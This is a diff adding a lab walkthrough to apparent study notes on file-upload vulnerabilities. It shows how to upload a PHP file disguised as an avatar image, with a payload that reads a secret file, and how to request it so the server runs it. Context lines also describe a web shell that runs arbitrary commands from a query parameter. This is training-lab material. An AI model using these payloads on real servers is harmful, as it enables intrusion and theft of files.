@@ -46,3 +46,16 @@ A more versatile web shell may look something like this:
 This script enables you to pass an arbitrary system command via a query parameter as follows:
 
 GET /example/exploit.php?command=id HTTP/1.1
+
+# LAB 1
+- While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
+- Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
+- In Burp, go to Proxy > HTTP history. Click the filter bar to open the HTTP history filter window. Under Filter by MIME type, enable the Images checkbox, then apply your changes.
+- In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>. Send this request to Burp Repeater.
+- In Burp, after sending the POST request for the image in the repeater, change the file name of the image to exploit.php. Then replace the contents of the image with a php command: <?php echo file_get_contents('/home/carlos/secret'); ?>
+- In Burp Repeater, change the path of the request to point to your PHP file:
+
+GET /files/avatars/exploit.php HTTP/1.1
+Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
+Submit the secret to solve the lab.
+
